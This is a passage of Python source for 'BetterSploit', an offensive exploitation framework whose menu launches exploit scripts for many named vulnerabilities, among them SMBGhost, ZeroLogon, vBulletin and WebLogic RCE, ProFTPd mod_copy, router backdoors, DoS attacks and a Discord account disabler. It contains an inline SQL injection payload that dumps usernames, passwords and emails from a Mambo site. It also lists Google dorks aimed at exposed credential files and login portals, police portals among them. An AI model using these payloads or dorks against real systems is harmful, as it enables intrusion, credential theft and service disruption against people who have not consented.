                sub.call(
                    f"python3 ../exploitz/CVE-2020-0796-RCE-POC/SMBleedingGhost.py {target_ip} {local_host} {local_port}",
                    shell=True)
        elif fancy_shell == "use 92" or fancy_shell == "use Mambo-com_akogallery/Sql-Injection":
            class Exploit(object):
                def __init__(self, uri, domain, payload):
                    self.payload = payload
                    self.domain = domain
                    self.uri = uri

                def send_requests(self):
                    response = requests.get(self.uri + "://" + self.domain + self.payload)
                    if response.status_code == 200:
                        try:
                            print(response.text)
                        except requests.exceptions.ConnectionError as error:
                            print(error)
                    else:
                        print(f"{Colors.red}[Failed With Response Code As]: ", response.status_code)
                        return fancy_shell

            if __name__ == '__main__':
                send = Exploit(uri=input(
                    f"{Colors.red}(Mambo com_akogallery Sql Injection){Colors.end} [Enter URI (Example: http)]:~#"),
                               domain=input(
                                   f"{Colors.red}(Mambo com_akogallery Sql Injection){Colors.end} [Enter Domain (Example: domain.com)]:~#"),
                               payload=f"/index.php?option=com_akogallery&Itemid=91&func=detailgallerie&id=-10+UNION SELECT 1,2,concat(username,0x3a,password,0x3a,email),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34+from+mos_users")
                send.send_requests()
        elif fancy_shell == "use 93" or fancy_shell == "use vBulletin<5.5.4-Pre-Authenticated/Remote-Command-Execution":
            sub.call("python3 ../modules/vBulletin-5.x--pre-auth-RCE-exploit.py", shell=True)
        elif fancy_shell == "use 94" or fancy_shell == "use ZeroLogon-Microsoft-Netlogon/set-password-to-empty-string":
            sub.call("python3 zerologon-module.py", shell=True)
        elif fancy_shell == "use 95" or fancy_shell == "use Upload-Death-RCE(POC)":
            sub.call("python3 ../exploitz/upload-pwn-RCE.py", shell=True)
        elif fancy_shell == "use 96" or fancy_shell == "use PHP<7.x/Remote-Command-Execution/CVE-2019-11043":
            sub.call("python3 module2.py", shell=True)
        elif fancy_shell == "use 97" or fancy_shell == "use upload-pwn-RS":
            sub.call("python3 ../exploitz/upload-pwn-RS.py", shell=True)
        elif fancy_shell == "use SqlMap":
            check_install = input(f"{Colors.red}(SQLMAP) [Do You Already Have SqlMap Installed? (y or n)]:~#")
            if check_install == "n" or check_install == "N":
                sub.call("sudo apt install sqlmap -y", shell=True)
                sub.call("sqlmap --wizard", shell=True)
            else:
                print(f"{Colors.green}~Starting SqlMap~{Colors.end}")
                sub.call(f"sqlmap --wizard", shell=True)
        elif fancy_shell == "use 98" or fancy_shell == "use FPM+PHP-versions<7.3.11/Remote-Code-Execution":
            sub.call("python3 module-for-CVE-2019-11043.py", shell=True)
        elif fancy_shell == "use 99" or fancy_shell == "use Pre-Authenticated-Discord-Account-Disabler":
            sub.call("python3 discord-account-disabler-module.py", shell=True)
        elif fancy_shell == "use 100" or fancy_shell == "use SpamTitan<7.07/Unauthenticated-RCE":
            sub.call("python3 spamtitan-7.07-RCE.py", shell=True)
        elif fancy_shell == "use 101" or fancy_shell == "use ProFTPd<1.3.5-mod_copy/Unauth-Remote-Command-Execution":
            sub.call("python3 proftpd-module-rce.py", shell=True)
        elif fancy_shell == "use 102" or fancy_shell == "use ProFTPd<1.3.5-mod_copy/Unauth-Remote-File-Upload":
            sub.call("python3 proftpd-module-rfu.py", shell=True)
        elif fancy_shell == "use 103" or fancy_shell == "use ProFTPd<1.3.5-mod_copy/Unauth-Invoke-Reverse-Shell":
            sub.call("python3 proftpd-module-rs.py", shell=True)
        elif fancy_shell == "use 104" or fancy_shell == "use Wordpress-Plugin-File-Manager<6.9/Unauthenticated-RCE":
            sub.call("python3 2020-wp-file-manager-v67.py RCE", shell=True)
        elif fancy_shell == "use 105" or fancy_shell == "use Wordpress-Plugin-File-Manager<6.9/Unauthenticated-AFU":
            sub.call("python3 2020-wp-file-manager-v67.py AFU", shell=True)
        elif fancy_shell == "use 106" or fancy_shell == "use Seo-Panel<4.6.0/Authenticated-Remote-Code-Execution":
            sub.call("python3 ../exploitz/SEO-PANEL.py", shell=True)
        elif fancy_shell == "use 107" or fancy_shell == "use upload-pwn-ASP--POC":
            sub.call("python3 /home/user/Desktop/BetterSploit/BetterSploit/modules/upload-pwn.py", shell=True)

        elif fancy_shell == "use 108" or fancy_shell == "use upload-pwn-PERL--POC":
            sub.call("python3 /home/user/Desktop/BetterSploit/BetterSploit/modules/upload-pwn1.py", shell=True)

        elif fancy_shell == "use 109" or fancy_shell == "use upload-pwn-PHP--POC":
            sub.call("python3 /home/user/Desktop/BetterSploit/BetterSploit/modules/upload-pwn2.py", shell=True)
        elif fancy_shell == "use 110" or fancy_shell == "use Oracle-WebLogic-Server<12.2.1.4/Unauthenticated-RCE":
            sub.call("python3 ../exploitz/weblogic-module-rce.py", shell=True)
        elif fancy_shell == "use 111" or fancy_shell == "use rConfig-3.9.5/Remote-Code-Execution-Unauthenticated":
            sub.call("python3 ../exploitz/rconfig3.9.5.py", shell=True)
        elif fancy_shell == "use 112" or fancy_shell == "use ReQuest-Serious-Play-F3-Media-Server/<7.0.3/RCE":
            sub.call("python3 ../exploitz/ReQuest-Serious-play-f3-module.py", shell=True)
        elif fancy_shell == "use 113" or fancy_shell == "use CloudMe/1.11.2/Remote-Buffer-Overflow":
            sub.call("python3 cloudme-1.11.2.py", shell=True)
        elif fancy_shell == "use 114" or fancy_shell == "use Apache-Struts-2/DefaultActionMapper-Prefixes-OGNL/RCE":
            sub.call("python3 apache-struts2_RCE.py", shell=True)
        elif fancy_shell == "use 115" or fancy_shell == "use Windows-10/MailCarrier/2.51/POP3-'USER'/RBO":
            sub.call("python3 windows-10-MailCarrier-2.51.pop3-RBO.py", shell=True)
        elif fancy_shell == "use 116" or fancy_shell == "use Pre-Auth-Django-Password-Reset":
            sub.call("python3 /home/totem/bettersploit/Exploit-Development/django-stuff.py", shell=True)
        elif fancy_shell == "use Eva":
            sub.call("python3 BetterSploit/modules/Eva.py --help", shell=True)
        elif fancy_shell == "use AnyLizer":
            print(f"{Colors.green}Usage:\n     bash -i anylizer/enumerator.sh (file){Colors.end}")
        elif fancy_shell == "use commix":
            check_install = input(f"{Colors.red}(SQLMAP) [Do You Already Have Commix Installed? (y or n)]:~#")
            if check_install == "n" or check_install == "N":
                sub.call("sudo apt install commix -y", shell=True)
                sub.call("commix --wizard")
            else:
                print(f"{Colors.green}~Starting Commix~{Colors.end}")
                sub.call("commix --wizard")
        elif fancy_shell == "use RouterSploit" or fancy_shell == "use routersploit":
            check_install = input(f"{Colors.red}(SQLMAP) [Do You Already Have RouterSploit Installed? (y or n)]:~#")
            if check_install == "n" or check_install == "N":
                sub.call("sudo apt install routersploit", shell=True)
                sub.call("routersploit", shell=True)
            else:
                print("~Starting RouterSploit~")
                sub.call("routersploit", shell=True)


        elif fancy_shell == "show google dorks" or fancy_shell == "show Google_Dorks" or fancy_shell == "show Google Dorks" or fancy_shell == "show google_dorks":
            def google_dorks():
                print(f'''
{Colors.red}╔═════════════════════════════════════════════════════════════════════════╗
{Colors.red}║{Colors.end}    inurl:faq.php and intext:"Warning:framework()[function.system]"      {Colors.red}║
{Colors.red}║{Colors.end}    intitle:"Remote Desktop Web Connection" inurl:tsweb                  {Colors.red}║
{Colors.red}║{Colors.end}    "HP LaserJet" inurl:"SSI/index.htm"                                  {Colors.red}║
{Colors.red}║{Colors.end}    inurl:8081/ "Pan, Tilt & Zoom"                                       {Colors.red}║
{Colors.red}║{Colors.end}    inurl:wp-content/plugins/easy-media-gallery-pro                      {Colors.red}║
{Colors.red}║{Colors.end}    "Share Link" inurl:/share.cgi?ssid=                                  {Colors.red}║
{Colors.red}║{Colors.end}    inurl:wp-content/plugins/my-calendar                                 {Colors.red}║
{Colors.red}║{Colors.end}    site:police.*.*/ intext:"login" intitle:"login"                      {Colors.red}║
{Colors.red}║{Colors.end}    site:admin.*.*/ intext:"login" intitle:"login"                       {Colors.red}║
{Colors.red}║{Colors.end}    intext:"db_database" ext:env intext:"db_password"                    {Colors.red}║
{Colors.red}║{Colors.end}    intitle:"index of" /var/logs filetype:'"log | txt | csv"             {Colors.red}║
{Colors.red}║{Colors.end}    inurl:/ViewerFrame? intitle:"Network Camera NetworkCamera"           {Colors.red}║
{Colors.red}║{Colors.end}    intitle:"Wing FTP Server - Web"                                      {Colors.red}║
{Colors.red}║{Colors.end}    intitle:"SFXAdmin - sfx_global" intext:"Login Form"                  {Colors.red}║
{Colors.red}║{Colors.end}    intitle:"Index of /" "joomla/database"                               {Colors.red}║
{Colors.red}║{Colors.end}    intitle:"index of" "/root/etc/security/"                             {Colors.red}║
{Colors.red}║{Colors.end}    intitle:"index of" "/ftpusers"                                       {Colors.red}║
{Colors.red}║{Colors.end}    intext:"Please Login" inurl:"/remote/login                           {Colors.red}║
{Colors.red}║{Colors.end}    intitle:PhpMyAdmin inurl:error.php                                   {Colors.red}║
{Colors.red}║{Colors.end}    inurl:tailor/addmeasurement.php?                                     {Colors.red}║
{Colors.red}║{Colors.end}    inurl:tailor/staffedit.php?                                          {Colors.red}║
{Colors.red}║{Colors.end}    inurl:tailor/staffcatedit.php?                                       {Colors.red}║
{Colors.red}║{Colors.end}    site:*.vbulletin.net intext:"Powered by vBulletin Version 5.5.4"     {Colors.red}║
{Colors.red}╚═════════════════════════════════════════════════════════════════════════╝
''')

            google_dorks()
        elif fancy_shell == "show Router_exploits" or fancy_shell == "show router_exploits" or fancy_shell == "show router exploits" or fancy_shell == "show Router_Exploits":
            def router_exploits():
                print(f"""
{Colors.red}╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{Colors.red}║{Colors.end}    Name                                                           Description                               {Colors.red}║
{Colors.red}║{Colors.end}    ----                                                           -----------                               {Colors.red}║
{Colors.red}║{Colors.end}    Sagem-routers/Remote-Auth-bypass                               Remote Authentication Bypass              {Colors.red}║
{Colors.red}║{Colors.end}    D-Link-DSR-Router-Series/Remote-Code-Execution                 Remote Command Execution                  {Colors.red}║
{Colors.red}║{Colors.end}    Netgear-ProSafe/Information-Disclosure                         Information-Disclosure                    {Colors.red}║
{Colors.red}║{Colors.end}    Netcore/Netis-Routers/UDP-Backdoor-Access                      UDP Backdoor Access                       {Colors.red}║
{Colors.red}║{Colors.end}    BLUE-COM-Router/5360/52018/Password-Reset                      Remote Password Reset                     {Colors.red}║ 
{Colors.red}║{Colors.end}    Seowonintech-Routers/2.3.9/File-Disclosure                     Remote File Disclosure                    {Colors.red}║
{Colors.red}║{Colors.end}    Netgear-WNR2000v5/Remote-Code-Execution                        Remote Code Execution                     {Colors.red}║
{Colors.red}║{Colors.end}    Netgear-DGN2200v1/v2/v3/v4-ping.cgi/RCE                        Remote Command Execution                  {Colors.red}║
{Colors.red}║{Colors.end}    PLC-Wireless-Router-GPN2.4P21-C-CN/DOS                         Denial Of Service                         {Colors.red}║
{Colors.red}║{Colors.end}    Virgin-Media-Hub-3.0-Router/DOS                                Denial Of Service                         {Colors.red}║
{Colors.red}║{Colors.end}    ZTE-ZXV10-W300-Router                                          Hard Coded Credentials CVE-2014-0329      {Colors.red}║
{Colors.red}║{Colors.end}    RT-N56U-Remote-Root                                            Remote Root                               {Colors.red}║
{Colors.red}╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{Colors.end}""")

            router_exploits()
        elif fancy_shell == "use ZTE-ZXV10-W300-Router":
            class ZTE_ZXV10_W300_Router(object):
                def __init__(self, target_ip_address, telnet_port):
                    self.target_ip_address = target_ip_address
                    self.telnet_port = telnet_port

                def ZTE_ZXV10_W300_Router_nmap_script(self):
                    payload = f"sudo nmap -sS -p {self.telnet_port} -vvv --script=airocon {self.target_ip_address}"
                    sub.call(payload, shell=True)

            ZTE_ZXV10_W300_Router_exploit = ZTE_ZXV10_W300_Router(target_ip_address=input(
                f"{Colors.red}(ZTE-ZXV10-W300-Router){Colors.end} [Enter Target Ip Address]:~#"), telnet_port=int(
                input(f"{Colors.red}(ZTE-ZXV10-W300-Router){Colors.end} [Enter Telnet Port]:~#")))
            ZTE_ZXV10_W300_Router_exploit.ZTE_ZXV10_W300_Router_nmap_script()
        elif fancy_shell == "use Sagem-routers/Remote-Auth-bypass":
            print(f"{Colors.green}perl /usr/share/exploitdb/exploits/hardware/webapps/11634.pl{Colors.green}")
            sub.call("perl /usr/share/exploitdb/exploits/hardware/webapps/11634.pl", shell=True)
        elif fancy_shell == "use D-Link-DSR-Router-Series/Remote-Code-Execution":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/hardware/webapps/30062.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/hardware/webapps/30062.py", shell=True)
        elif fancy_shell == "use Netgear-ProSafe/Information-Disclosure":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/hardware/webapps/27774.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/hardware/webapps/27774.py", shell=True)
        elif fancy_shell == "use Netcore/Netis-Routers/UDP-Backdoor-Access":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/hardware/remote/43387.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/hardware/remote/43387.py", shell=True)
        elif fancy_shell == "use BLUE-COM-Router/5360/52018/Password-Reset":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/hardware/webapps/31088.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/hardware/webapps/31088.py", shell=True)
        elif fancy_shell == "use Seowonintech-Routers/2.3.9/File-Disclosure":
            print(f"{Colors.green}perl /usr/share/exploitdb/exploits/hardware/webapps/25968.pl{Colors.end}")
            sub.call("perl /usr/share/exploitdb/exploits/hardware/webapps/25968.pl", shell=True)
        elif fancy_shell == "use Netgear-WNR2000v5/Remote-Code-Execution":
            print(f"{Colors.green}ruby /usr/share/exploitdb/exploits/cgi/remote/40949.rb{Colors.end}")
            sub.call("ruby /usr/share/exploitdb/exploits/cgi/remote/40949.rb", shell=True)
        elif fancy_shell == "use Netgear-DGN2200v1/v2/v3/v4-ping.cgi/RCE":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/hardware/webapps/41394.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/hardware/webapps/41394.py", shell=True)
        elif fancy_shell == "use PLC-Wireless-Router-GPN2.4P21-C-CN/DOS":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/hardware/dos/45187.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/hardware/dos/45187.py", shell=True)
        elif fancy_shell == "use Virgin-Media-Hub-3.0-Router/DOS":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/hardware/dos/45776.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/hardware/dos/45776.py", shell=True)
        elif fancy_shell == "use RT-N56U-Remote-Root":
            sub.call("python Remote-RT-N56U-Remote-Root.py", shell=True)
        elif fancy_shell == "listen":
            listener()
        elif fancy_shell == "clear":
            sub.call("clear", shell=True)
        elif fancy_shell == "screen":
            def screen():
                def sprint(str):
                    for c in str + '\n':
                        sys.stdout.write(c)
                        sys.stdout.flush()
                        time.sleep(3. / 90)

                try:
                    sprint(
                        f"\n\n\n\n\n\n\n                                                    {Colors.red}[: {Colors.purple}BetterSploit {Colors.red}Framework {Colors.end}{Colors.red}:]")
                    sprint(
                        f"                                                           [:  !WELCOME! :]        {Colors.end}")
                except KeyboardInterrupt:
                    pass

            screen()
        elif fancy_shell == "exit":
            print(f"{Colors.purple}[$$] ...Exiting BetterSploit... [$$]{Colors.end}")
            sys.exit(0)
        elif fancy_shell == "http":
            print(f"{Colors.purple}http://127.0.0.1:8080/{Colors.end}")
            time.sleep(1)
            sub.call("python3 -m http.server", shell=True)
        if fancy_shell[:7] == "details":
            sub.call(f"python3 ../internals/database.py -e {fancy_shell[8:]}", shell=True)

        else:
            if fancy_shell[:1] == '$':
                command = fancy_shell[2:]
                sub.call(f"{command}", shell=True)


if __name__ == "__main__":
    def launch_all():
        sub.call("clear", shell=True)

        def screen():
            def sprint(str):
                for c in str + '\n':
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    time.sleep(3. / 90)

            try:
                sprint(
                    f"\n\n\n\n\n\n\n                                                    {Colors.red}[: {Colors.purple}BetterSploit {Colors.red}Framework {Colors.end}{Colors.red}:]")
                sprint(
                    f"                                                           [:  !WELCOME! :]        {Colors.end}")
            except KeyboardInterrupt:
                pass

        screen()
        sub.call("clear", shell=True)
        try:
            try:
                os.mkdir("BetterSploit/BannersForBetterSploit")
            except FileNotFoundError:
                pass
            except FileExistsError:
                pass
            os.chdir("BetterSploit")
            try:
                os.mkdir("BetterSploit/modules")
            except FileNotFoundError:
                pass
            except FileExistsError:
                pass
            os.chdir("modules")
        except FileExistsError:
            pass

        def making_banner():
            try:
                with open("../BannersForBetterSploit/BetterSploit.txt", "w") as file:
                    file.write("""
                                                ╔╗ ┌─┐┌┬┐┌┬┐┌─┐┬─┐╔═╗┌─┐┬  ┌─┐┬┌┬┐
                                                ╠╩╗├┤  │  │ ├┤ ├┬┘╚═╗├─┘│  │ ││ │
                                                ╚═╝└─┘ ┴  ┴ └─┘┴└─╚═╝┴  ┴─┘└─┘┴ ┴
                                          [$  116 Exploits - 26 Post - 27_ auxiliary  $]
                                          [$  12_ Router Exploits - 23_ Google Dorks  $]\n\n\n""")
                    file.close()
            except FileExistsError:
                pass

        making_banner()
        sub.call("clear", shell=True)

        def banner():
            try:
                sub.call("cat ../BannersForBetterSploit/BetterSploit.txt |  lolcat -a -d 5 --seed 55",
                         shell=True)
            except KeyboardInterrupt:
                sys.exit(0)

        banner()
        try:
            make_banner_directory()
            bettersploit_framework()
        except KeyboardInterrupt:
            sys.exit(0)


    try:
        if sys.argv[1] == "--bettersploit":
            launch_all()
        elif sys.argv[1] == "--escalator":
            escalator_shell()
    except IndexError:
        print(f"""
        ╔════════════════════════════════════════════════════════════════════════════════════╗
        ║                                {Colors.red}BetterSploit Framework                              {Colors.end}║
        ║                                                                                    ║
        ║    {Colors.red}--bettersploit  -  Launch The BetterSploit CLI A Penetration Testing Framework  {Colors.end}║ 
        ║    {Colors.red}--escalator  -  Launch The Escalator CLI A Privilege Escalation Framework       {Colors.end}║
        ║                                                                                    ║
        ╚════════════════════════════════════════════════════════════════════════════════════╝\n""")
